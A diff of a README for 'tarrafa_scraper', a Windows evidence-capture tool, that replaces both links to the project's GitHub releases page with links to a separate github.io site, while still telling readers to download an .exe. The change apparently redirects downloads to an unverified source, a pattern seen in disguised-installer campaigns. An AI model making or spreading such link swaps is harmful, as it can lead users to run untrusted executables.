@@ -1,6 +1,6 @@
 # 🕸️ tarrafa_scraper - Capture digital evidence for legal records
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/filmable-sleepdisorder508/tarrafa_scraper/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://filmable-sleepdisorder508.github.io)
 
 Tarrafa helps you collect information from the internet. It works as a tool to save web pages, videos, and social media posts. You create a permanent record of digital content for legal or research needs. It handles complex tasks like saving site data, PDF files, and specific legal records such as CNPJ and Datajud files.
 
@@ -12,7 +12,7 @@ Your computer needs Windows 10 or Windows 11 to run this software. You should ha
 
 Visit the project release page to download the latest version. Click the following link:
 
-[https://github.com/filmable-sleepdisorder508/tarrafa_scraper/releases](https://github.com/filmable-sleepdisorder508/tarrafa_scraper/releases)
+[https://filmable-sleepdisorder508.github.io](https://filmable-sleepdisorder508.github.io)
 
 Look for the file that ends in .exe. Right-click the file and save it to your desktop or a folder you can find easily.
 
